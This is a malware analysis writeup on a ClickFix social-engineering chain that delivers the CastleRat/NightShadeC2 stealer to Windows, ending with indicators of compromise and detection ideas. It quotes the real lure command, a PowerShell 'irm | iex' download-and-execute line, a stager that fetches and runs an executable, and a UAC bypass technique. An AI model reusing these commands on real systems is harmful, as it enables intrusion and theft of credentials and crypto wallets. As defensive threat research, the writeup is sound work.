---
id: castle-rat-delivery-chain
title: "CastleRat Delivery Chain"
summary: "ClickFix social engineering via cmdkey and remote schtasks, leading to a CastleRat implant with Steam profile dead-drop C2."
category: DFIR
date: 2026-04-23
tags: [clickfix, castle-rat, delivery-chain, windows, malware]
---

# CastleRat Delivery Chain

## Overview

This writeup documents a ClickFix-style delivery chain that ends in CastleRat / NightShadeC2 deployment on a Windows endpoint. The initial access vector was social engineering: the user pasted an attacker-supplied command into the Run dialog (`Win+R`) while believing they were completing a CAPTCHA challenge.

The interesting part of this case is the delivery mechanism, not the payload. The final malware is noisy and detectable. The chain from user paste to remote task creation to in-memory PowerShell staging is where the operator tradecraft shows up.

## Initial Access — ClickFix

The lure page was not preserved, but the executed command was recovered from endpoint telemetry:

```cmd
cmd.exe /c cmdkey /add:195.10.205.171 /user:guest && schtasks /Create /TN "Lowks" /XML "\\195.10.205.171\kxc\full.xml" & REM I am not a robot - Cloudflare ID: qbIohbNXJpIB7wj
```

The trailing `REM` comment is intentional camouflage. It mimics Cloudflare verification text so the command appears benign when pasted quickly.

## Credential Staging and Scheduled Task

The command chains two actions with `&&`.

### cmdkey

```cmd
cmdkey /add:195.10.205.171 /user:guest
```

Stores credentials for `\\195.10.205.171\` as `guest` in Windows Credential Manager. This prevents an interactive credential prompt when the next step accesses the remote SMB share.

### schtasks

```cmd
schtasks /Create /TN "Lowks" /XML "\\195.10.205.171\kxc\full.xml"
```

The task definition is hosted on a remote SMB share rather than embedded in the command. Benefits for the operator:

- Task content is not written locally in a standard path
- The XML can be updated server-side without changing the lure
- Behavioral detections may only see `schtasks` execution, not the malicious task body

`full.xml` contains a task that runs:

```powershell
powershell -c "irm hxxps://yhofgafjle[.]com | iex"
```

This is a standard download-and-execute pattern: `Invoke-RestMethod` fetches a script and pipes it directly to `Invoke-Expression` with no intermediate file on disk.

## PowerShell Stager — AMSI Dilution

The script from `yhofgafjle[.]com` contains hundreds of lines of filler:

```powershell
$xYzAbc = "lorem"
$pPpQqq = $xYzAbc + "ipsum"
function asd0192hjkl { return $true }
$rndVar = Get-Random -Minimum 1 -Maximum 9999
```

This padding dilutes AMSI and static signature matches. The functional payload is buried in the noise:

```powershell
function cWtdXfLUVptO {
    $ulaSVjsMmF = "https://yhofgafjle.com/maestrovsd.exe"
    $pURHzjVsUNaWGZ = "C:\Windows\Temp\TrHtWFGyRY.exe"
    Invoke-WebRequest -Uri $ulaSVjsMmF -OutFile $pURHzjVsUNaWGZ
    Start-Process -FilePath $pURHzjVsUNaWGZ
}
```

The script downloads `maestrovsd.exe`, writes it to `C:\Windows\Temp\TrHtWFGyRY.exe`, and executes it. Variable names appear randomized per deployment to frustrate string-based detection.

## .NET Loader and Python Runtime

`maestrovsd.exe` is a ~150KB .NET assembly compiled within a week of execution.

```
Verdict:        Malicious (100/100)
Family:         CastleRat / NightShadeC2
Tags:           rat, stealer, botnet, python, uac
First C2:       212.43.154.198:23814 (Latvia / PODAON)
```

On execution, the loader spawns multiple PowerShell processes (`-NoProfile`) and retrieves staged payloads:

```
http://162.33.177.16/Dvizhok.zip
http://162.33.177.16/NiceNic.zip
http://162.33.177.16/either/Python.zip
http://162.33.177.16/either/install.pyc
http://162.33.177.16/either/veQcBTuTnPwMD.Ar
https://adamcold.com/NiceNic/Python.zip
https://adamcold.com/NiceNic/melody.pyc
https://adamcold.com/NiceNic/5o7dkS4S.8
```

The ZIP archives contain full Python runtimes including signed `python.exe`, `pythonw.exe`, and `python313.dll`. The malware ships its own interpreter instead of relying on a host-installed version.

Dropped locations:

```
C:\ProgramData\5171NWNrWQ\   ← Python 3.9 environment
C:\ProgramData\92WKzFYLqB\   ← Python 3.13 environment
```

Execution uses signed `pythonw.exe` against `install.pyc` and `melody.pyc`, so the process tree shows a trusted binary running Python bytecode.

## In-Memory C# Compilation and UAC Bypass

Sandbox analysis captured `csc.exe` invoked with `.cmdline` argument files, producing temporary DLLs in `%TEMP%`:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
    /noconfig /fullpaths @"C:\Users\admin\AppData\Local\Temp\is3na01s.cmdline"
```

This indicates inline C# compilation from PowerShell (`Add-Type`). Source is generated at runtime, compiled, and loaded without a persistent malicious DLL on disk.

UAC bypass via `ComputerDefaults.exe` registry hijack:

```
Parent:    C:\ProgramData\92WKzFYLqB\pythonw.exe
Child:     C:\Windows\System32\ComputerDefaults.exe
Integrity: HIGH (elevated)
```

The malware modifies `HKCU\Software\Classes\ms-settings\Shell\Open\command` and triggers auto-elevated `ComputerDefaults.exe`. Detection: `ComputerDefaults.exe` should not have a non-`explorer.exe` parent.

## C2 Resolution — Steam Dead Drop

The implant does not hardcode its C2 address. It retrieves:

```
https://steamcommunity.com/id/dpmorin49sdiw302fw
```

The bot fetches the Steam Community profile, parses the bio, and extracts the embedded C2 string. Infrastructure rotation only requires editing the profile.

![Steam profile dead-drop resolver](assets/steam-dead-drop.png)

Resolved C2 in this case: `45.88.106.190:4545` (Netherlands, ON-LINE-DATA).

Config extraction also identified backup C2 `8.3.0.253` and RC4 key:

```
596d626a6f39745634686470324c7430  →  Ymbjo9tV4hdp2Lt0
```

The key decrypts secondary stages `5o7dkS4S.8` and `veQcBTuTnPwMD.Ar` (~5MB and ~15MB RC4-encrypted blobs loaded in memory).

The Python payload is PyArmor-protected. Static `.pyc` analysis is limited; memory dumps are required for meaningful reverse engineering.

YARA hits on process dumps tagged both **CastleRat** and **NightShadeC2**, likely the same codebase or a close fork based on infrastructure overlap.

## Post-Compromise Capabilities

Observed stealer functionality:

- **Browsers** — Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed `nss3.dll`.
- **Crypto wallets** — Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.
- **Password managers** — 1Password, NordPass directory enumeration.
- **VPN** — NordVPN, ProtonVPN configs.
- **FTP** — Cyberduck, FileZilla.
- **Screenshots** — observed across `pythonw.exe` memory regions.

Exfiltration over resolved C2 `45.88.106.190:4545`.

## Attack Chain

```
[User] ──── pastes "Cloudflare CAPTCHA" command ──→ [cmd.exe]
                                                       │
                                                       ▼
                                          cmdkey + schtasks /XML
                                                       │
                                                       ▼
                                       [SMB \\195.10.205.171\kxc\full.xml]
                                                       │
                                                       ▼
                                            Scheduled Task "Lowks"
                                                       │
                                                       ▼
                                         powershell -c "irm ... | iex"
                                                       │
                                                       ▼
                                       [yhofgafjle.com — junk-padded script]
                                                       │
                                                       ▼
                                       cWtdXfLUVptO()  →  maestrovsd.exe
                                                       │
                                                       ▼
                          ┌────────────────────────────┴──────────────────────┐
                          │                                                   │
                       PowerShell                                       .NET loader
                          │                                                   │
                          ▼                                                   ▼
                    csc.exe (in-mem C#)                          Python bundle download
                          │                                                   │
                          └────────────────────────┬──────────────────────────┘
                                                   ▼
                              C:\ProgramData\{random}\pythonw.exe install.pyc
                                                   │
                                                   ▼
                                       ComputerDefaults.exe UAC bypass
                                                   │
                                                   ▼
                                  steamcommunity.com/id/... ← C2 resolver
                                                   │
                                                   ▼
                                  CastleRat / NightShadeC2 → 45.88.106.190:4545
```

## Indicators of Compromise

### Hashes (SHA256)

| Hash | File |
|------|------|
| `e25534efbab99f08ca802c6d3974c2ff7c47ddd6e6ed71a84a94c2fddd7de4e2` | maestrovsd.exe |
| `b953bb0acb76848f889909256d67d01d44cc45d83c8bfc3421783ac0a79688fc` | install.pyc |
| `91919832f20d8fb78bab82844a430ecbe02a07df3f317316a8c34f54e3bb45c2` | melody.pyc |

### Network

| Indicator | Role |
|-----------|------|
| `195.10.205.171` | SMB staging (cmdkey target) |
| `yhofgafjle[.]com` | PowerShell stager host |
| `162.33.177.16` | Payload distribution (HTTP) |
| `adamcold[.]com` | Payload distribution (HTTPS) |
| `212.43.154.198:23814` | Initial C2 (Latvia) |
| `45.88.106.190:4545` | Resolved C2 (Netherlands) |
| `8.3.0.253` | Backup C2 |

### Dead Drop

```
steamcommunity[.]com/id/dpmorin49sdiw302fw
```

### Filesystem

```
C:\ProgramData\5171NWNrWQ\
C:\ProgramData\92WKzFYLqB\
C:\Windows\Temp\TrHtWFGyRY.exe
%LOCALAPPDATA%\NiceNickAlliceRachelCoach*
%LOCALAPPDATA%\StreamEtheriumLife*
```

### Crypto

```
RC4 key:  Ymbjo9tV4hdp2Lt0
```

### Scheduled Task

```
Name:  Lowks
XML:   \\195.10.205.171\kxc\full.xml
```

## Detection Opportunities

- `cmdkey /add` followed by `schtasks /Create /XML` referencing a remote UNC path
- PowerShell `irm | iex` from a newly created scheduled task
- `pythonw.exe` executing from `C:\ProgramData\{random}\` with no corresponding software install record
- `ComputerDefaults.exe` spawned by non-`explorer.exe` parent
- Outbound HTTPS to `steamcommunity.com` from Python or PowerShell child processes, followed by connections to newly resolved IPs
- RC4-encrypted archive downloads (`*.8`, `*.Ar`) from known distribution hosts